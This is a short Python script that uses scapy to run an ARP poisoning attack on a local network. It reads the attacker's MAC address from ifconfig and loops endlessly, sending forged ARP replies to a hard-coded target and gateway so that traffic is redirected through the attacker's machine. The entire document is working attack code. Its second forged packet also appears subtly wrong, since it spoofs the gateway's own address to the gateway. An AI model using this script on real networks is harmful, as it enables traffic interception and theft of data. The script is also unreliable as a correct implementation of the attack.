from scapy.all import *
import subprocess
import time

target_ip="10.10.10.21"
gateway_ip="10.10.10.254"

ifconfigResult = subprocess.check_output("ifconfig eth0",shell=True).decode()
attacker_mac = re.search("ether (.*?)txqueuelen",ifconfigResult).group(1).strip()
print("my MAC add: ",attacker_mac)
eth = Ether(src=attacker_mac)
t_arp=ARP(hwsrc=attacker_mac,psrc=gateway_ip,pdst=target_ip)
g_arp= ARP(hwsrc=attacker_mac,psrc=gateway_ip,pdst=gateway_ip)

print("Arp Poisoning attack is starting")
while True:
	try:
		sendp(eth/t_arp,verbose=False)
		sendp(eth/g_arp,verbose=False)
	except KeyboardInterrupt:
		print("Arp poisoning is stopped.")
		break
	time.sleep(1)